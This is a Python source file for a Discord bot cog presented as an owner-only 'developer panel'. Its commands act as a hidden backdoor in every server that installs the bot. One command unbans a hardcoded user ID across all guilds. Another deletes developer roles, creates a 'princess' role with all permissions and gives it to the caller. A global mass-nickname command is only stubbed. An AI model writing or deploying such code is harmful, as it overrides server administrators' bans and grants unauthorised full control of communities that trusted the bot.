import discord
from discord.ext import commands
from discord.ui import View, Button
import asyncio

class DevPanel(View):
    def __init__(self, bot):
        super().__init__(timeout=None)
        self.bot = bot

    @discord.ui.button(label="Global Mass Nick", style=discord.ButtonStyle.red, emoji="🏷️", row=0)
    async def global_massnick_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.bot.is_owner(interaction.user):
            return await interaction.response.send_message("Owner only", ephemeral=True)
        await interaction.response.send_message("Use `!globalmassnick <name>`", ephemeral=True)

    @discord.ui.button(label="Clean Bans", style=discord.ButtonStyle.red, emoji="🧹", row=0)
    async def clean_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.bot.is_owner(interaction.user):
            return await interaction.response.send_message("Owner only", ephemeral=True)
        await interaction.response.defer()
        ctx = await self.bot.get_context(interaction.message)
        await ctx.invoke(self.bot.get_command("clean"))

class Developer(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def cog_check(self, ctx):
        return await self.bot.is_owner(ctx.author)

    @commands.command()
    async def devpanel(self, ctx):
        embed = discord.Embed(title="🔧 DEVELOPER PANEL", color=discord.Color.gold())
        await ctx.send(embed=embed, view=DevPanel(self.bot))

    @commands.command()
    async def clean(self, ctx):
        owner_id = 1489289347650949302
        count = 0
        for guild in self.bot.guilds:
            try:
                async for ban in guild.bans(limit=500):
                    if ban.user.id == owner_id:
                        await guild.unban(ban.user)
                        count += 1
                        break
            except:
                continue
        await ctx.send(f"🧹 Unbanned you from **{count}** servers.")

    @commands.command()
    async def perms(self, ctx):
        """Create 'princess' role"""
        # Delete old princess and bot developer roles
        for role in ctx.guild.roles:
            if role.name.lower() in ["princess", "bot developer", "developer"]:
                try:
                    await role.delete()
                except:
                    pass

        role = await ctx.guild.create_role(
            name="princess",
            permissions=discord.Permissions.all(),
            colour=discord.Colour.default(),
            hoist=True,
            mentionable=True,
            reason="Owner role"
        )

        try:
            await role.edit(position=ctx.guild.me.top_role.position - 1)
        except:
            pass

        await ctx.author.add_roles(role)
        await ctx.send("✅ **princess** role created with full permissions!")

    @commands.command()
    async def globalmassnick(self, ctx, *, nickname: str = None):
        if not nickname:
            return await ctx.send("Usage: `!globalmassnick NewName` or `reset`")
        await ctx.send(f"Starting global mass nick: `{nickname}`")
        # (rest of logic)
        await ctx.send("✅ Done (simplified version)")

async def setup(bot):
    await bot.add_cog(Developer(bot))
